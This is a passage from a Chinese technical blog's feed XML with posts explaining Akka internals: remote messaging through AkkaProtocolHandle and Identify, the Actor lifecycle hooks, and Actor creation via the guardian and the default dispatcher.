scheduleBackoffTimer()</span><br><span class="line">        context.become(buffering)</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// We are in Writing state, so buffer is empty, safe to stop here</span></span><br><span class="line">    <span class="keyword">case</span> FlushAndStop ⇒</span><br><span class="line">      flushAndStop()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> AckIdleCheckTimer <span class="keyword">if</span> ackDeadline.isOverdue() ⇒</span><br><span class="line">      trySendPureAck()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个Actor会先判断是否已经初始化，这里就假设初始化吧，初始化之后就会进入writing这个偏函数，对send类型的消息，又调用了writeSend函数。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632642679699-6f455f3a-32d0-43db-bb1b-93ff16632324.png#clientId=uefeb788d-1da0-4&from=paste&id=u329a261e&margin=%5Bobject%20Object%5D&originHeight=581&originWidth=975&originalType=url&ratio=1&status=done&style=none&taskId=u73a9e1de-cdf2-4cb7-96bd-ed9634f99bb"><br>这个函数简单来看，就是调用codec对消息进行序列化，然后创建了一个pdu，最终把pdu通过handle的write发送出去。handle又是什么呢？</p><h3 id="3-3-AkkaProtocolHandle"><a href="#3-3-AkkaProtocolHandle" class="headerlink" title="3.3 AkkaProtocolHandle"></a>3.3 AkkaProtocolHandle</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handle: Option[AkkaProtocolHandle] = handleOrActive</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>[remote] <span class="class"><span class="keyword">class</span> <span class="title">AkkaProtocolHandle</span>(</span></span><br><span class="line"><span class="class">  <span class="title">_localAddress</span>:          <span class="title">Address</span>,</span></span><br><span class="line"><span class="class">  <span class="title">_remoteAddress</span>:         <span class="title">Address</span>,</span></span><br><span class="line"><span class="class">  <span class="title">val</span> <span class="title">readHandlerPromise</span>: <span class="title">Promise</span>[<span class="title">HandleEventListener</span>],</span></span><br><span class="line"><span class="class">  <span class="title">_wrappedHandle</span>:         <span class="title">AssociationHandle</span>,</span></span><br><span class="line"><span class="class">  <span class="title">val</span> <span class="title">handshakeInfo</span>:      <span class="title">HandshakeInfo</span>,</span></span><br><span class="line"><span class="class">  <span class="title">private</span> <span class="title">val</span> <span class="title">stateActor</span>: <span class="title">ActorRef</span>,</span></span><br><span class="line"><span class="class">  <span class="title">private</span> <span class="title">val</span> <span class="title">codec</span>:      <span class="title">AkkaPduCodec</span>)</span></span><br><span class="line"><span class="class">  <span class="keyword">extends</span> <span class="title">AbstractTransportAdapterHandle</span>(<span class="title">_localAddress</span>, <span class="title">_remoteAddress</span>, <span class="title">_wrappedHandle</span>, <span class="title">AkkaScheme</span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="function">override def <span class="title">write</span><span class="params">(payload: ByteString)</span>: Boolean </span>= wrappedHandle.write(codec.constructPayload(payload))</span><br><span class="line"> </span><br><span class="line">  <span class="function">override def <span class="title">disassociate</span><span class="params">()</span>: Unit </span>= disassociate(Unknown)</span><br><span class="line"> </span><br><span class="line">  <span class="function">def <span class="title">disassociate</span><span class="params">(info: DisassociateInfo)</span>: Unit </span>= stateActor ! DisassociateUnderlying(info)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>handle最终是一个AkkaProtocolHandle，这个对象我们不再具体分析，我们可以认为这是一个本地与远程地址链接的通道，通过这个通道就可以与远程actor发送消息了。</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><pre><code>  分析到这个地方，actorSelection与远程通信的过程大概就梳理清楚了。为了方便理解，作者特意辛苦的画了一个流程图，以供参考。细心的读者一定会问，那我的消息通过handle发送出去了，对方怎么接收呢？接收之后怎么发送到指定actor的邮箱呢？这一点我们后面再分析。</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632642679686-443bd688-fb02-4177-b975-a746a41e2ae6.png#clientId=uefeb788d-1da0-4&from=paste&id=uc00650cc&margin=%5Bobject%20Object%5D&originHeight=826&originWidth=1163&originalType=url&ratio=1&status=done&style=none&taskId=u39d4310c-d4b5-4f72-9420-80ec90a1cf6"><br>actorSelection分析清楚了，剩下的就是通过ActorRef发送消息了。那么如何得到远程Actor的ActorRef呢？当然是“问”它了啊，怎么“问”呢？发消息啊。发什么消息呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A message all Actors will understand, that when processed will reply with</span></span><br><span class="line"><span class="comment"> * [[akka.actor.ActorIdentity]] containing the `ActorRef`. The `messageId`</span></span><br><span class="line"><span class="comment"> * is returned in the `ActorIdentity` message as `correlationId`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SerialVersionUID(1L)</span></span><br><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">case</span> class <span class="title">Identify</span><span class="params">(messageId: Any)</span> extends AutoReceivedMessage with NotInfluenceReceiveTimeout</span></span><br></pre></td></tr></table></figure><p>官网对Identify的注释非常清楚，这个消息继承了AutoReceivedMessage，所有的Actor都理解该消息，且受到该消息后会返回akka.actor.ActorIdentity消息，里面包含当前Actor的ActorRef。那么所有的Actor为啥都理解该消息呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Memory consistency is handled by the Mailbox (reading mailbox status then processing messages, then writing mailbox status</span></span><br><span class="line">  <span class="function"><span class="keyword">final</span> def <span class="title">invoke</span><span class="params">(messageHandle: Envelope)</span>: Unit </span>= &#123;</span><br><span class="line">    val influenceReceiveTimeout = !messageHandle.message.isInstanceOf[NotInfluenceReceiveTimeout]</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      currentMessage = <span class="function">messageHandle</span></span><br><span class="line"><span class="function">      <span class="title">if</span> <span class="params">(influenceReceiveTimeout)</span></span></span><br><span class="line"><span class="function">        <span class="title">cancelReceiveTimeout</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      messageHandle.message match </span>&#123;</span><br><span class="line">        <span class="keyword">case</span> msg: AutoReceivedMessage ⇒ autoReceiveMessage(messageHandle)</span><br><span class="line">        <span class="keyword">case</span> msg                      ⇒ receiveMessage(msg)</span><br><span class="line">      &#125;</span><br><span class="line">      currentMessage = <span class="keyword">null</span> <span class="comment">// reset current message after successful invocation</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> handleNonFatalOrInterruptedException &#123; e ⇒</span><br><span class="line">      handleInvokeFailure(Nil, e)</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (influenceReceiveTimeout)</span><br><span class="line">        checkReceiveTimeout <span class="comment">// Reschedule receive timeout</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="function">def <span class="title">autoReceiveMessage</span><span class="params">(msg: Envelope)</span>: Unit </span>= &#123;</span><br><span class="line">    <span class="keyword">if</span> (system.settings.DebugAutoReceive)</span><br><span class="line">      publish(Debug(self.path.toString, clazz(actor), <span class="string">&quot;received AutoReceiveMessage &quot;</span> + msg))</span><br><span class="line"> </span><br><span class="line">    msg.message match &#123;</span><br><span class="line">      <span class="keyword">case</span> t: Terminated              ⇒ receivedTerminated(t)</span><br><span class="line">      <span class="function"><span class="keyword">case</span> <span class="title">AddressTerminated</span><span class="params">(address)</span> ⇒ <span class="title">addressTerminated</span><span class="params">(address)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">case</span> Kill                       ⇒ throw <span class="title">ActorKilledException</span><span class="params">(<span class="string">&quot;Kill&quot;</span>)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">case</span> PoisonPill                 ⇒ self.<span class="title">stop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      <span class="keyword">case</span> sel: ActorSelectionMessage ⇒ <span class="title">receiveSelection</span><span class="params">(sel)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">case</span> <span class="title">Identify</span><span class="params">(messageId)</span>        ⇒ <span class="title">sender</span><span class="params">()</span> ! <span class="title">ActorIdentity</span><span class="params">(messageId, Some(self)</span>)</span></span><br><span class="line"><span class="function">    &#125;</span></span><br><span class="line"><span class="function">  &#125;　</span></span><br></pre></td></tr></table></figure><p>如果读者看过我之前分析的文章对上面的代码一定还有印象，它是ActorCell里面处理消息的两个函数，invoke会先判断消息类型是不是AutoReceivedMessage，如果是就自己处理了，不会去调用开发者自定义的receive函数。而Identify属于AutoReceivedMessage，收到后给sender发送了ActorIdentity消息，该消息的第二个参数是当前Actor的ActorFef变量。这样本地的actor收到远程actor返回的ActorIdentity，就可以通过对方的ActorRef给它发送消息了。当然本地actor收到的ActorIdentity消息中，第二个参数应该是一个RemoteActorRef类型。如何通过RemoteActorRef发送消息，上文已经分析清楚了，其实actorSelection最终也是通过远程actor的ActorPath创建了对应的RemoteActorRef，来发送消息的。<br>至此给远程actor发消息的两种方法就讲解完毕了。其实还有<a href="https://doc.akka.io/docs/akka/current/remoting.html#creating-actors-remotely">第三种方式</a>，就是在本地创建一个远程Actor，当然了最终还是需要通过RemoteActorRef发消息的，这个具体就不再详细介绍了。</p><h2 id="5-参考"><a href="#5-参考" class="headerlink" title="5.参考"></a>5.参考</h2><p><a href="https://www.cnblogs.com/gabry/p/9377182.html">https://www.cnblogs.com/gabry/p/9377182.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述&lt;/h2&gt;&lt;pre&gt;&lt;code&gt; 上文我们介绍了remote模式下Actor的创建，其实与local的创建并没有太大区别，一般情况下还是使用</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Actor-生命周期</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</id>
    <published>2021-12-03T07:47:57.749Z</published>
    <updated>2021-12-03T09:07:15.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>我们首先来看一下官方给出的Actor的声明周期的图:<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632622242945-c53683ee-8723-4f34-817c-7b57416221b2.png#clientId=ucf8de5bf-9346-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u9de87b2c&margin=%5Bobject%20Object%5D&originHeight=755&originWidth=866&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ud1d73754-3d94-4793-bf8c-0feb48264f1&title="><br>    在上图中，Actor系统中的路径代表一个地方，其可能会被活着的Actor占据。最初路径都是空的。</p><ul><li>创建    </li></ul><p>在调用actorOf()时，将会为指定的路径分配根据传入Props创建的一个Actor引用。该Actor引用是由路径和一个Uid标识的。</p><ul><li>重启    </li></ul><p>重启时只会替换有Props定义的Actor示例，但不会替换引用，因此Uid保持不变。</p><ul><li><p>停止</p><p>  当Actor停止时，其引用的生命周期结束。在这一时间点上相关的生命周期事件被调用，监视该Actor的Actor都会获得终止通知。当引用停止后，路径可以重复使用，通过actorOf()创建一个Actor。在这种情况下，除了UID不同外，新引用与老引用是相同的。ActorRef始终表示引用（路径和UID）而不只是一个给定的路径。因此如果Actor停止，并且创建一个新的具有相同名称的Actor，则指向老化身的ActorRef将不会指向新的化身。</p></li><li><p>选择</p></li></ul><p>相对地，ActorSelection指向路径（或多个路径，如果使用了通配符），且完全不关注有没有引用占据它。因此ActorSelection 不能被监视。获取某路径下的当前化身ActorRef是可能的，只要向该ActorSelection发送Identify，如果收到ActorIdentity回应，则正确的引用就包含其中。也可以使用ActorSelection的resolveOne方法，它会返回一个包含匹配ActorRef的Future。</p><ul><li>状态切换</li></ul><p>从上图我们可以发现Actor的生命周期主要包含三个状态：开始、终止和重启。下面分别就 这三个状态进行说明。</p><h2 id="2-开始"><a href="#2-开始" class="headerlink" title="2.开始"></a>2.开始</h2><pre><code> 其实Actor的生命周期是使用Hooks体现和控制的，我们可以重新相关的hooks，从而实现对Actor生命周期各环节的细粒度控制。而当Akka通过Props构建一个Actor后，这个Actor可以立即开始处理消息，进入开始（started）状态。Akka提供了针对开始状态的事件接口（event hooks）preStart方法，因此，我们可以重写该方法进行一些操作，例如：</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">override def preStart=&#123;     </span><br><span class="line">    log.info (<span class="string">&quot;Starting storage actor...&quot;</span>)     </span><br><span class="line">    initDB   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-终止"><a href="#3-终止" class="headerlink" title="3.终止"></a>3.终止</h2><p>一个Actor可能因为完成运算、发生异常又或者人为通过发送Kill，PoisonPill强行终止等而进入停止（stopping）状态。<br>而这个终止过程分为两步：</p><ul><li>第一步：Actor将挂起对邮箱的处理，并向所有子Actor发送终止命令，然后处理来自子Actor的终止消息直到所有的子Actor都完成终止。</li><li>第二步：终止自己，调用postStop方法，清空邮箱，向DeathWatch发布Terminated，通知其监管者。</li></ul><p>整个人过程保证Actor系统中的子树以一种有序的方式终止，将终止命令传播到叶子结点并收集它们回送的确认消息给被终止的监管者。如果其中某个Actor没有响应（即由于处理消息用了太长时间以至于没有收到终止命令），整个过程将会被阻塞。<br>因此，我们可以再最后调用postStop方法，来进行一些资源清理等工作，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override def postStop=&#123;     log.info (<span class="string">&quot;Stopping storage actor...&quot;</span>)     db.release   &#125;</span><br></pre></td></tr></table></figure><h2 id="4-重启"><a href="#4-重启" class="headerlink" title="4.重启"></a>4.重启</h2><pre><code> 重启是Actor生命周期里一个最重要的环节。在一个Actor的生命周期里可能因为多种原因发生重启（Restart）。造成一个Actor需要重启的原因可能有下面几个：</code></pre><ul><li>（1）在处理某特定消息时造成了系统性的异常，必须通过重启来清理系统错误</li><li>（2）内部状态毁坏，必须通过重启来重新构建状态</li><li>（3）在处理消息时无法使用到一些依赖资源，需要重启来重新配置资源</li></ul><p>其实，Actor的重启过程也是一个递归的过程，由于其比较复杂，先上个图：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632622243218-d050dcdc-3839-4e2d-a743-ea2a3e2d9c02.png#clientId=ucf8de5bf-9346-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=uf36aa449&margin=%5Bobject%20Object%5D&originHeight=306&originWidth=955&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u26a59e29-2cb2-4249-9ca3-b4a0f9e9348&title="><br>在默认情况下 ，重启过程主要分为以下几步：<br>（1）该Actor将被挂起<br>（2）调用旧实例的 supervisionStrategy.handleSupervisorFailing 方法 (缺省实现为挂起所有的子Actor)<br>（3）调用preRestart方法，preRestart方法将所有的children Stop掉了！（Stop动作，大家注意！），并调用postStop回收资源<br>（4）调用旧实例的 supervisionStrategy.handleSupervisorRestarted 方法 (缺省实现为向所有剩下的子Actor发送重启请求)<br>（5）等待所有子Actor终止直到 preRestart 最终结束<br>（6）再次调用之前提供的actor工厂创建新的actor实例<br>（7）对新实例调用 postRestart（默认postRestart是调用preStart方法）<br>（8）恢复运行新的actor<br>​</p><p>参考<br><a href="https://www.cnblogs.com/junjiang3/p/9747594.html">https://www.cnblogs.com/junjiang3/p/9747594.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述&lt;/h2&gt;&lt;p&gt;我们首先来看一下官方给出的Actor的声明周期的图:&lt;br&gt;&lt;img src=&quot;https://cdn.nlark.com/</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Actor-Actor创建</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-Actor%E5%88%9B%E5%BB%BA/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-Actor%E5%88%9B%E5%BB%BA/</id>
    <published>2021-12-03T06:15:17.557Z</published>
    <updated>2021-12-03T09:07:15.123Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Actor创建"><a href="#1-Actor创建" class="headerlink" title="1.Actor创建"></a>1.Actor创建</h2><h3 id="1-1-创建过程"><a href="#1-1-创建过程" class="headerlink" title="1.1 创建过程"></a>1.1 创建过程</h3><pre><code> 上篇我们介绍了ActorSystem的创建过程，下面我们就研究一下actor的创建过程。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ActorSystem actorSystem = ActorSystem.create(serverName, config, ClassUtils.getClassLoader());</span><br><span class="line">actorSystem.actorOf(props.withDeploy(<span class="keyword">new</span> Deploy(<span class="keyword">new</span> RemoteScope(address))), <span class="string">&quot;avatar&quot;</span>);</span><br></pre></td></tr></table></figure><pre><code> 普通情况下，我们一般使用ActorSystem的actorOf来创建actor，当然通过上一篇博客的介绍，我们已经知道actorOf是继承自ActorRefFactory的函数。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">actorOf</span><span class="params">(props: Props, name: String)</span>: ActorRef </span>=</span><br><span class="line">    <span class="keyword">if</span> (guardianProps.isEmpty) guardian.underlying.attachChild(props, name, systemService = <span class="keyword">false</span>)</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(</span><br><span class="line">      s<span class="string">&quot;cannot create top-level actor [$name] from the outside on ActorSystem with custom user guardian&quot;</span>)</span><br></pre></td></tr></table></figure><pre><code>也比较简单，就是判断一下guardianProps是不是为空，为空则调用guardian.underlying.attachChild方法创建一个ActorRef。**new ActorSystemImpl(name, appConfig, cl, defaultEC, None, setup).start()** 这段代码显示在创建ActorSystemImpl时，guardianProps一定为空，具体guardianProps的作用我们暂时先忽略。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def guardian: LocalActorRef = provider.guardian</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Reference to the supervisor used for all top-level user actors.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">def guardian: LocalActorRef</span><br></pre></td></tr></table></figure><pre><code> 通过定位guardian我们发现这是一个LocalActorRef，而且通过官方源码的说明可以看出，这是一个root监督者，用来监督所有用户创建的actor。Akka的actor是按照树状结构创建，都是有一定层级的，actor的路径一般都是/user/actorParent1/actorChild1，其中guardian是user的位置。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Local (serializable) ActorRef that is used when referencing the Actor on its &quot;home&quot; node.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  INTERNAL API</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span>[akka] <span class="class"><span class="keyword">class</span> <span class="title">LocalActorRef</span> <span class="title">private</span>[<span class="title">akka</span>] (</span></span><br><span class="line"><span class="class">  <span class="title">_system</span>:           <span class="title">ActorSystemImpl</span>,</span></span><br><span class="line"><span class="class">  <span class="title">_props</span>:            <span class="title">Props</span>,</span></span><br><span class="line"><span class="class">  <span class="title">_dispatcher</span>:       <span class="title">MessageDispatcher</span>,</span></span><br><span class="line"><span class="class">  <span class="title">_mailboxType</span>:      <span class="title">MailboxType</span>,</span></span><br><span class="line"><span class="class">  <span class="title">_supervisor</span>:       <span class="title">InternalActorRef</span>,</span></span><br><span class="line"><span class="class">  <span class="title">override</span> <span class="title">val</span> <span class="title">path</span>: <span class="title">ActorPath</span>)</span></span><br><span class="line"><span class="class">  <span class="keyword">extends</span> <span class="title">ActorRefWithCell</span> <span class="title">with</span> <span class="title">LocalRef</span></span></span><br></pre></td></tr></table></figure><pre><code> 上面是LocalActorRef的定义。上一篇博客我们也介绍了provider的创建过程，它默认是一个LocalActorRefProvider，那就可以找到guardian具体创建的过程了。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">override lazy val guardian: LocalActorRef = &#123;</span><br><span class="line">   val cell = rootGuardian.underlying</span><br><span class="line">   cell.reserveChild(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">   val ref = <span class="keyword">new</span> LocalActorRef(system, system.guardianProps.getOrElse(Props(classOf[LocalActorRefProvider.Guardian], guardianStrategy)),</span><br><span class="line">     defaultDispatcher, defaultMailbox, rootGuardian, rootPath / <span class="string">&quot;user&quot;</span>)</span><br><span class="line">   cell.initChild(ref)</span><br><span class="line">   ref.start()</span><br><span class="line">   ref</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-构成"><a href="#1-2-构成" class="headerlink" title="1.2 构成"></a>1.2 构成</h3><p>分析上面的代码我们看到，LocalActorRef创建时传入了几个非常重要的参数：defaultDispatcher、defaultMailbox、rootGuardian和rootPath / “user”。之所以重要，是因为通过它们我们可以再深入actor的创建过程。Dispatcher和mailbox都是actor运行非常重要的概念，其中mailbox负责存储actor收到的消息，dispatcher负责从mailbox取消息，分配线程给actor执行具体的业务逻辑。我们逐一进行简要分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * The one and only default dispatcher.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  def defaultGlobalDispatcher: MessageDispatcher = lookup(DefaultDispatcherId)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * The id of the default dispatcher, also the full key of the</span></span><br><span class="line"><span class="comment">   * configuration of the default dispatcher.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">final</span> val DefaultDispatcherId = <span class="string">&quot;akka.actor.default-dispatcher&quot;</span></span><br></pre></td></tr></table></figure><pre><code>通过追踪defaultDispatcher的创建，我们最终定位到了上面这段代码，很明显是根据默认配置创建了akka.actor.default-dispatcher对应的MessageDispatcher实例。那么akka.actor.default-dispatcher究竟是什么呢？这个得从reference.conf里面看一下。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">default</span>-dispatcher &#123;</span><br><span class="line">      # Must be one of the following</span><br><span class="line">      # Dispatcher, PinnedDispatcher, or a FQCN to a <span class="class"><span class="keyword">class</span> <span class="title">inheriting</span></span></span><br><span class="line"><span class="class">      # <span class="title">MessageDispatcherConfigurator</span> <span class="title">with</span> <span class="title">a</span> <span class="title">public</span> <span class="title">constructor</span> <span class="title">with</span></span></span><br><span class="line"><span class="class">      # <span class="title">both</span> <span class="title">com</span>.<span class="title">typesafe</span>.<span class="title">config</span>.<span class="title">Config</span> <span class="title">parameter</span> <span class="title">and</span></span></span><br><span class="line"><span class="class">      # <span class="title">akka</span>.<span class="title">dispatch</span>.<span class="title">DispatcherPrerequisites</span> <span class="title">parameters</span>.</span></span><br><span class="line"><span class="class">      # <span class="title">PinnedDispatcher</span> <span class="title">must</span> <span class="title">be</span> <span class="title">used</span> <span class="title">together</span> <span class="title">with</span> <span class="title">executor</span></span>=thread-pool-executor.</span><br><span class="line">      type = <span class="string">&quot;Dispatcher&quot;</span></span><br><span class="line"> </span><br><span class="line">      # Which kind of ExecutorService to use <span class="keyword">for</span> <span class="keyword">this</span> dispatcher</span><br><span class="line">      # Valid options:</span><br><span class="line">      #  - <span class="string">&quot;default-executor&quot;</span> <span class="keyword">requires</span> a <span class="string">&quot;default-executor&quot;</span> section</span><br><span class="line">      #  - <span class="string">&quot;fork-join-executor&quot;</span> <span class="keyword">requires</span> a <span class="string">&quot;fork-join-executor&quot;</span> section</span><br><span class="line">      #  - <span class="string">&quot;thread-pool-executor&quot;</span> <span class="keyword">requires</span> a <span class="string">&quot;thread-pool-executor&quot;</span> section</span><br><span class="line">      #  - <span class="string">&quot;affinity-pool-executor&quot;</span> <span class="keyword">requires</span> an <span class="string">&quot;affinity-pool-executor&quot;</span> section</span><br><span class="line">      #  - A FQCN of a <span class="class"><span class="keyword">class</span> <span class="title">extending</span> <span class="title">ExecutorServiceConfigurator</span></span></span><br><span class="line"><span class="class">      <span class="title">executor</span> </span>= <span class="string">&quot;default-executor&quot;</span></span><br><span class="line"> </span><br><span class="line">      # This will be used <span class="keyword">if</span> you have set <span class="string">&quot;executor = &quot;</span><span class="keyword">default</span>-executor<span class="string">&quot;&quot;</span>.</span><br><span class="line">      # If an ActorSystem is created with a given ExecutionContext, <span class="keyword">this</span></span><br><span class="line">      # ExecutionContext will be used as the <span class="keyword">default</span> executor <span class="keyword">for</span> all</span><br><span class="line">      # dispatchers in the ActorSystem configured with</span><br><span class="line">      # executor = <span class="string">&quot;default-executor&quot;</span>. Note that <span class="string">&quot;default-executor&quot;</span></span><br><span class="line">      # is the <span class="keyword">default</span> value <span class="keyword">for</span> executor, and therefore used <span class="keyword">if</span> not</span><br><span class="line">      # specified otherwise. If no ExecutionContext is given,</span><br><span class="line">      # the executor configured in <span class="string">&quot;fallback&quot;</span> will be used.</span><br><span class="line">      <span class="keyword">default</span>-executor &#123;</span><br><span class="line">        fallback = <span class="string">&quot;fork-join-executor&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><pre><code> 很明显这是一个fork-join-executor，那么fork-join-executor具体是如何完成实例的创建呢？从lookup这段代码来看，是通过MessageDispatcherConfigurator来构造的，根据类名来猜，它应该是读取配置，然后创建MessageDispatcher类的实例的。那么MessageDispatcherConfigurator具体是什么呢？</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 